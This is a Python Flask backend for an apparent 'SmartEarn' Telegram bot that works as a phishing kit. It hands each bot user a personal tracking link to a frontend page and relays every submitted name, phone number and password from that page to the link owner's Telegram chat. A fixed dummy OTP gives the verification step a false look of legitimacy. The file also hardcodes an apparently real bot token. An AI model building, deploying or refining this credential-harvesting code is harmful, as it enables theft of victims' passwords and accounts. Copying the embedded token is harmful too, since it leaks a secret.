# =======================================
# SmartEarn Multi-User Bot System (Railway Ready)
# Developer: MN SIDDIK
# =======================================

from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import uuid

app = Flask(__name__)
CORS(app)  # Cross-Origin enabled for Netlify frontend

BOT_TOKEN = "8572616463:AAH1sQJsSlYOhj657naFUpKvlNquwtjzrLI"  # Telegram bot token
BASE_URL = "https://smart-earning.netlify.app"  # Netlify frontend URL

# Runtime memory storage
USERS = {}       # UID -> chat_id mapping
OTP_STORE = {}   # UID -> OTP (dummy OTP for testing)

# =======================================
# Telegram webhook route
# =======================================
@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def handle_telegram():
    data = request.get_json()
    if "message" in data:
        chat_id = data["message"]["chat"]["id"]
        text = data["message"].get("text","")
        if text == "/start":
            unique_id = str(uuid.uuid4())[:8]
            USERS[unique_id] = chat_id
            OTP_STORE[unique_id] = "1234"  # dummy OTP
            link = f"{BASE_URL}/?uid={unique_id}"
            send_message(chat_id, f"🎉 Welcome!\n\n🔗 Your unique link:\n{link}\n\nOnly for you 🔒")
    return jsonify({"ok": True})

# =======================================
# Receive form data from frontend
# =======================================
@app.route("/send", methods=["POST"])
def handle_form():
    data = request.get_json()
    uid = data.get("uid")
    name = data.get("name")
    number = data.get("number")
    password = data.get("password")

    if not uid or uid not in USERS:
        return jsonify({"error":"Invalid or expired UID"}), 400

    chat_id = USERS[uid]
    message = (
        f"📥 *New Signup Submission*\n\n"
        f"👤 Name: {name}\n"
        f"📞 Number: {number}\n"
        f"🔑 Password: {password}\n\n"
        f"🆔 UID: {uid}"
    )
    send_message(chat_id, message)
    return jsonify({"success": True})

# =======================================
# OTP verification
# =======================================
@app.route("/verify", methods=["POST"])
def verify_otp():
    data = request.get_json()
    uid = data.get("uid")
    otp = data.get("otp")

    if not uid or uid not in OTP_STORE:
        return jsonify({"error":"Invalid UID"}), 400

    if otp == OTP_STORE[uid]:
        del OTP_STORE[uid]  # OTP used
        return jsonify({"success": True})
    return jsonify({"error":"Invalid OTP"}), 400

# =======================================
# Helper: Send Telegram message
# =======================================
def send_message(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode":"Markdown"}
    requests.post(url, json=payload)

@app.route("/", methods=["GET"])
def home():
    return "✅ SmartEarn Bot Running!"

if __name__=="__main__":
    app.run(host="0.0.0.0", port=8080)
